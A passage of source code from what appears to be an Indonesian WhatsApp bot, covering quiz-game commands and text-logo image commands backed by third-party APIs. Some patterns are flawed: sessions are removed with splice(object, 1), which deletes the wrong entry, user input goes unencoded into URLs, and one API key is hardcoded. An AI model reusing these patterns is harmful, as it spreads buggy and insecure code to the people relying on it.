conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tebakkata)}`, buttons: [{ buttonId: '.tebakkata', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `klik button untuk bermain kembali` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkata)}
tebakkata.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkata.json', JSON.stringify(tebakkata, null, 2))
}
}
break
case 'asahotak':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, asahotak) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
asahotak.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/asahotak.json', JSON.stringify(asahotak))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, asahotak) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, asahotak)}`, buttons: [{ buttonId: '.asahotak', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delAsahO = {id: sender, jawaban: cekGame("jawaban", sender, asahotak)}
asahotak.splice(delAsahO, 1)
fs.writeFileSync('./database/game/asahotak.json', JSON.stringify(asahotak, null, 2))
}
}

break

case 'caklontong':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, caklontong) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
caklontong.push({id: sender, jawaban: result.jawaban, deskripsi: result.deskripsi})
fs.writeFileSync('./database/game/caklontong.json', JSON.stringify(caklontong))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, caklontong) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, caklontong)}\nDeskripsi : ${cekGame("deskripsi", sender, caklontong)}`, buttons: [{ buttonId: '.caklontong', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delCakL = {id: sender, jawaban: cekGame("jawaban", sender, caklontong)}
caklontong.splice(delCakL, 1)
fs.writeFileSync('./database/game/caklontong.json', JSON.stringify(caklontong, null, 2))
}
}

break

case 'tebakgambar':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tebakgambar) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebakgambar.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/tebakgambar.json', JSON.stringify(tebakgambar))
conn.sendMessage(from, { image: { url: result.img }, caption: `Silahkan jawab pertanyaan di atas ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, tebakgambar) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tebakgambar)}`, buttons: [{ buttonId: '.tebakgambar', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delTebakG = {id: sender, jawaban: cekGame("jawaban", sender, tebakgambar)}
tebakgambar.splice(delTebakG, 1)
fs.writeFileSync('./database/game/tebakgambar.json', JSON.stringify(tebakgambar, null, 2))
}
}

break



case 'tebakbendera':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tebakbendera) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebakbendera.push({id: sender, jawaban: result.name})
fs.writeFileSync('./database/game/tebakbendera.json', JSON.stringify(tebakbendera))
conn.sendMessage(from, { image: { url: result.img }, caption: `Bendera apakah itu?\n\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.name)
await sleep(60000)
if (cekGame("id", sender, tebakbendera) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tebakbendera)}`, buttons: [{ buttonId: '.tebakbendera', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delTebakB = {id: sender, jawaban: cekGame("jawaban", sender, tebakbendera)}
tebakbendera.splice(delTebakB, 1)
fs.writeFileSync('./database/game/tebakbendera.json', JSON.stringify(tebakbendera, null, 2))
}
}

break

case 'tebakkalimat':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tebakkalimat) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebakkalimat.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/tebakkalimat.json', JSON.stringify(tebakkalimat))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, tebakkalimat) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tebakkalimat)}`, buttons: [{ buttonId: '.tebakkalimat', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkalimat)}
tebakkalimat.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkalimat.json', JSON.stringify(tebakkalimat, null, 2))
}
}

break

case 'siapakahaku':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, siapakahaku) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
let result = anu[Math.floor(Math.random() * anu.length)]
siapakahaku.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/siapakahaku.json', JSON.stringify(siapakahaku))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, siapakahaku) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, siapakahaku)}`, buttons: [{ buttonId: '.siapakahaku', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delSiapaKah = {id: sender, jawaban: cekGame("jawaban", sender, siapakahaku)}
siapakahaku.splice(delSiapaKah, 1)
fs.writeFileSync('./database/game/siapakahaku.json', JSON.stringify(siapakahaku, null, 2))
}
}

break

case 'tebakkimia':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tebakkimia) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebakkimia.push({id: sender, jawaban: result.lambang})
fs.writeFileSync('./database/game/tebakkimia.json', JSON.stringify(tebakkimia))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : Lambang ${result.unsur} Adalah?\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.lambang)
await sleep(60000)
if (cekGame("id", sender, tebakkimia) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tebakkimia)}`, buttons: [{ buttonId: '.tebakkimia', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkimia)}
tebakkimia.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkimia.json', JSON.stringify(tebakkimia, null, 2))
}
}

break

case 'tebaklirik':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tebaklirik) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebaklirik.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/tebaklirik.json', JSON.stringify(tebaklirik))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, tebaklirik) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tebaklirik)}`, buttons: [{ buttonId: '.tebaklirik', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delTebakL = {id: sender, jawaban: cekGame("jawaban", sender, tebaklirik)}
tebaklirik.splice(delTebakL, 1)
fs.writeFileSync('./database/game/tebaklirik.json', JSON.stringify(tebaklirik, null, 2))
}
}

break

case 'tebaktebakan':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tebaktebakan) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tebaktebakan.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/tebaktebakan.json', JSON.stringify(tebaktebakan))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, tebaktebakan) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tebaktebakan)}`, buttons: [{ buttonId: '.tebaktebakan', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delTebakT = {id: sender, jawaban: cekGame("jawaban", sender, tebaktebakan)}
tebaktebakan.splice(delTebakT, 1)
fs.writeFileSync('./database/game/tebaktebakan.json', JSON.stringify(tebaktebakan, null, 2))
}
}

break

case 'susunkata':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, susunkata) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
susunkata.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/susunkata.json', JSON.stringify(susunkata))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nType : ${result.tipe}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, susunkata) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, susunkata)}`, buttons: [{ buttonId: '.susunkata', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delSusunK = {id: sender, jawaban: cekGame("jawaban", sender, susunkata)}
susunkata.splice(delSusunK, 1)
fs.writeFileSync('./database/game/susunkata.json', JSON.stringify(susunkata, null, 2))
}
}

break

case 'tekateki':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (cekGame("id", sender, tekateki) !== null) return reply("Kamu masih ada sesi yang belum di selesaikan.")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
let result = anu[Math.floor(Math.random() * anu.length)]
tekateki.push({id: sender, jawaban: result.jawaban})
fs.writeFileSync('./database/game/tekateki.json', JSON.stringify(tekateki))
conn.sendMessage(from, { text: `Silahkan jawab pertanyaan di bawah ini\n\nSoal : ${result.soal}\nWaktu : 60 Detik`, buttons: [{ buttonId: '.nyerah', buttonText: { displayText: 'Nyerah' }, type: 1 }], footer: `Games Menu`}, { quoted: msg })
console.log("Jawaban: " + result.jawaban)
await sleep(60000)
if (cekGame("id", sender, tekateki) !== null) {
conn.sendMessage(from, { text: `Waktu habis\nJawaban : ${cekGame("jawaban", sender, tekateki)}`, buttons: [{ buttonId: '.tekateki', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `Games Menu` }, { quoted: msg })
let delTekaT = {id: sender, jawaban: cekGame("jawaban", sender, tekateki)}
tekateki.splice(delTekaT, 1)
fs.writeFileSync('./database/game/tekateki.json', JSON.stringify(tekateki, null, 2))
}
}

break

case 'nyerah': case 'menyerah':{
if (cekGame("id", sender, asahotak) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, asahotak)}`, buttons: [{ buttonId: '.asahotak', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delAsahO = {id: sender, jawaban: cekGame("jawaban", sender, asahotak)}
asahotak.splice(delAsahO, 1)
fs.writeFileSync('./database/game/asahotak.json', JSON.stringify(asahotak, null, 2))
} else if (cekGame("id", sender, caklontong) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, caklontong)}`, buttons: [{ buttonId: '.caklontong', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delCakL = {id: sender, jawaban: cekGame("jawaban", sender, caklontong), deskripsi: cekGame("deskripsi", sender, caklontong)}
caklontong.splice(delCakL, 1)
fs.writeFileSync('./database/game/caklontong.json', JSON.stringify(caklontong, null, 2))
} else if (cekGame("id", sender, tebakgambar) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tebakgambar)}`, buttons: [{ buttonId: '.tebakgambar', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTebakG = {id: sender, jawaban: cekGame("jawaban", sender, tebakgambar)}
tebakgambar.splice(delTebakG, 1)
fs.writeFileSync('./database/game/tebakgambar.json', JSON.stringify(tebakgambar, null, 2))
} else if (cekGame("id", sender, tebakkata) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tebakkata)}`, buttons: [{ buttonId: '.tebakkata', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkata)}
tebakkata.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkata.json', JSON.stringify(tebakkata, null, 2))
} else if (cekGame("id", sender, tebakbendera) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tebakbendera)}`, buttons: [{ buttonId: '.tebakbendera', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTebakB = {id: sender, jawaban: cekGame("jawaban", sender, tebakbendera)}
tebakbendera.splice(delTebakB, 1)
fs.writeFileSync('./database/game/tebakbendera.json', JSON.stringify(tebakbendera, null, 2))
} else if (cekGame("id", sender, tebakkalimat) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tebakkalimat)}`, buttons: [{ buttonId: '.tebakkalimat', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkalimat)}
tebakkalimat.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkalimat.json', JSON.stringify(tebakkalimat, null, 2))
} else if (cekGame("id", sender, siapakahaku) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, siapakahaku)}`, buttons: [{ buttonId: '.siapakahaku', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delSiapaK = {id: sender, jawaban: cekGame("jawaban", sender, siapakahaku)}
siapakahaku.splice(delSiapaK, 1)
fs.writeFileSync('./database/game/siapakahaku.json', JSON.stringify(siapakahaku, null, 2))
} else if (cekGame("id", sender, tebakkimia) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tebakkimia)}`, buttons: [{ buttonId: '.tebakkimia', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTebakK = {id: sender, jawaban: cekGame("jawaban", sender, tebakkimia)}
tebakkimia.splice(delTebakK, 1)
fs.writeFileSync('./database/game/tebakkimia.json', JSON.stringify(tebakkimia, null, 2))
} else if (cekGame("id", sender, tebaklirik) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tebaklirik)}`, buttons: [{ buttonId: '.tebaklirik', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTebakL = {id: sender, jawaban: cekGame("jawaban", sender, tebaklirik)}
tebaklirik.splice(delTebakL, 1)
fs.writeFileSync('./database/game/tebaklirik.json', JSON.stringify(tebaklirik, null, 2))
} else if (cekGame("id", sender, tebaktebakan) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tebaktebakan)}`, buttons: [{ buttonId: '.tebaktebakan', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTebakT = {id: sender, jawaban: cekGame("jawaban", sender, tebaktebakan)}
tebaktebakan.splice(delTebakT, 1)
fs.writeFileSync('./database/game/tebaktebakan.json', JSON.stringify(tebaktebakan, null, 2))
} else if (cekGame("id", sender, susunkata) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, susunkata)}`, buttons: [{ buttonId: '.susunkata', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delSusunK = {id: sender, jawaban: cekGame("jawaban", sender, susunkata)}
susunkata.splice(delSusunK, 1)
fs.writeFileSync('./database/game/susunkata.json', JSON.stringify(susunkata, null, 2))
} else if (cekGame("id", sender, tekateki) !== null) {
conn.sendMessage(from, { text: `Yahh ${command}😪\nJawaban : ${cekGame("jawaban", sender, tekateki)}`, buttons: [{ buttonId: '.tekateki', buttonText: { displayText: "Main Lagi" }, type: 1 }], footer: `IQ Lu dibawah Rata²` }, { quoted: msg })
let delTekaT = {id: sender, jawaban: cekGame("jawaban", sender, tekateki)}
tekateki.splice(delTekaT, 1)
fs.writeFileSync('./database/game/tekateki.json', JSON.stringify(tekateki, null, 2))
} else reply('Kamu tidak ada sesi game yang belum terselesaikan')
}
break

//»»————- ★ TEXTPRO MENU★ ————-««
case "metallic":
case "naruto":
case "butterfly":
case "flaming":{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`_Contoh_\n${prefix+command} Rama`)
reply(mess.wait)
let photooxy =`https://api.nataganz.com/api/photooxy/${command}?text=${q}&apikey=Pasha`
conn.sendMessage(from, {image: { url: photooxy }, caption: `Hasil dari ${command}`}, { quoted: msg})
}
break
case "pencil":case "thunder":case "neon":case "glich":case "berry":case "logobear":case "3dboxtext":{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`_Contoh_\n${prefix+command} RamaOfc`)
reply(mess.wait)
let papamu =`https://api.nataganz.com/api/textpro/${command}?text=${q}&apikey=${setting.nata_api}`
conn.sendMessage(from, {image: { url: papamu }, caption: `Hasil dari ${command}`}, { quoted: msg})
}
break
case 'halloween2': case 'blackpink':case 'rainbow2':case 'water_pipe':case 'halloween':case 'sketch':case 'sircuit':case 'discovery':case 'metallic2':case 'fiction':case 'demon':case 'transformer':case 'berry':case 'thunder':case 'magma':case '3dstone':case 'neon':case 'glitch':case 'harry_potter':case 'embossed':case 'broken':case 'papercut':case 'gradient':case 'glossy':case 'watercolor':case 'multicolor':case 'neon_devil':case 'underwater':case 'bear':case 'wonderfulg':case 'christmas':case 'neon_light':case 'snow':case 'cloudsky':case 'luxury2':case 'gradient2':case 'summer':case 'writing':case 'engraved':case 'summery':case '3dglue':case 'metaldark':case 'neonlight':case 'oscar':case 'minion':case 'holographic':case 'purple':case 'glossyb':case 'deluxe2':case 'glossyc':case 'fabric':case 'neonc':case 'newyear':case 'newyear2':case 'metals':case 'xmas':case 'blood':case 'darkg':case 'joker':case 'wicker':case 'natural':case 'firework':case 'skeleton':case 'balloon':case 'balloon2':case 'balloon3':case 'balloon4':case 'balloon5':case 'balloon6':case 'balloon7':case 'steel':case 'gloss':case 'denim':case 'decorate':case 'decorate2':case 'peridot':case 'rock':case 'glass':case 'glass2':case 'glass3':case 'glass4':case 'glass5':case 'glass6':case 'glass7':case 'glass8':case 'captain_as2':case 'robot':case 'equalizer':case 'toxic':case 'sparkling':case 'sparkling2':case 'sparkling3':case 'sparkling4':case 'sparkling5':case 'sparkling6':case 'sparkling7':case 'decorative':case 'chocolate':case 'strawberry':case 'koifish':case 'bread':case 'matrix':case 'blood2':case 'neonligth2':case 'thunder2':case '3dbox':case 'neon2':case 'roadw':case 'bokeh':case 'gneon':case 'advanced':case 'dropwater':case 'wall':case 'chrismast':case 'honey':case 'drug':case 'marble':case 'marble2':case 'ice':case 'juice':case 'rusty':case 'abstra':case 'biscuit':case 'wood':case 'scifi':case 'metalr':case 'purpleg':case 'shiny': case 'jewelry':case 'jewelry2':case 'jewelry3':case 'jewelry4':case 'jewelry5':case 'jewelry6':case 'jewelry7':case 'jewelry8':case 'metalh':case 'golden':case 'glitter':case 'glitter2':case 'glitter3':case 'glitter4':case 'glitter5':case 'glitter6':case 'glitter7':case 'metale':case 'carbon':case 'candy':case 'metalb':case 'gemb':case '3dchrome':case 'metalb2':case 'metalg':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`_Contoh_\n${prefix+command} RamaaOfc`)
reply(mess.wait)
let amu =`https://api.zeeoneofc.xyz/api/textpro/${command}?text=${q}&apikey=${setting.zeeonekey}`
conn.sendMessage(from, {image: { url: amu }, caption: `Hasil dari ${command}`}, { quoted: msg})
}
break
//teks 2
case "ninjalogo":{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q4 && !q5) return reply(`Gunakan text1|text2\nContoh ${prefix+command} Rama|kece`)
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.nataganz.com/api/textpro/ninja-logo?text=${q4}&text2=${q5}&apikey=${setting.nata_api}` }, caption: `Nih Logo nya ${command}🖼️` }, { quoted: msg})
}
break 
case 'horror':case 'game8bit':case 'layered':case 'glitch2':case 'coolg':case 'coolwg':case 'realistic':case 'space3d':case 'gtiktok':case 'stone':case 'marvel':case 'marvel2':case 'pornhub':case 'avengers':case 'metalr':case 'metalg':case 'metalg2':case 'lion':case 'wolf_bw':case 'wolf_g':case 'ninja':case '3dsteel':case 'horror2':case 'lava':case 'bagel':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q4 && !q5) return reply(`Gunakan text1|text2\nContoh ${prefix+command} Rama|kece`)
reply(mess.wait)
conn.sendMessage(from, { image: { url: `https://api.zeeoneofc.xyz/api/textpro/${command}?text=${q4}&text2=${q5}&apikey=${setting.zeeonekey}` }, caption: `Nih Logo nya ${command}🖼️` }, { quoted: msg})
}
break 
case 'battlegrounds-logo':
case 'battlefield4': case 'text-8bit':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q4 && !q5) return reply(`Gunakan text1|text2\nContoh ${prefix+command}  Rama|kece`)
reply(mess.wait)
